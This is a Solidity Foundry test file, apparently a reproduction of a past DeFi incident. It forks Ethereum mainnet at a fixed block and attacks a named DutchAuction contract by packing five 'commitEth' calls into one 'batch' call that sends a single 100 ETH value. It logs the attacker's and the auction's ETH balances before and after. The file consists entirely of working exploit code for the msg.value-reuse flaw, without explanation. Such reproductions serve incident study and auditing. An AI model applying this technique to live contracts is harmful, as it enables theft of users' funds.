// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";

interface IDutchAuction {
    function commitEth(
        address payable _beneficiary,
        bool readAndAgreedToMarketParticipationAgreement
    ) external payable;

    function batch(
        bytes[] calldata calls,
        bool revertOnFail
    )
        external
        payable
        returns (bool[] memory successes, bytes[] memory results);
}

contract ContractTest is Test {
    IDutchAuction DutchAuction =
        IDutchAuction(0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes[] public data;

    function setUp() public {
        vm.createSelectFork("mainnet", 13_038_771); //fork mainnet at block 13038771
    }

    function testExploit() public {
        payable(address(0)).transfer(79_228_162_414_264_337_593_543_950_335);
        emit log_named_uint(
            "Before exploit, ETH balance of attacker:",
            address(address(this)).balance
        );
        emit log_named_uint(
            "Before exploit, ETH balance of DutchAuction:",
            address(DutchAuction).balance
        );
        bytes memory payload = abi.encodePacked(
            DutchAuction.commitEth.selector,
            uint256(uint160(address(this))),
            uint256(uint8(0x01))
        );
        data.push(payload);
        data.push(payload);
        data.push(payload);
        data.push(payload);
        data.push(payload);
        DutchAuction.batch{value: 100_000_000_000_000_000_000}(data, true);
        emit log_named_uint(
            "After exploit, ETH balance of attacker:",
            address(address(this)).balance
        );
        emit log_named_uint(
            "After exploit, ETH balance of DutchAuction:",
            address(DutchAuction).balance
        );
    }

    receive() external payable {}
}
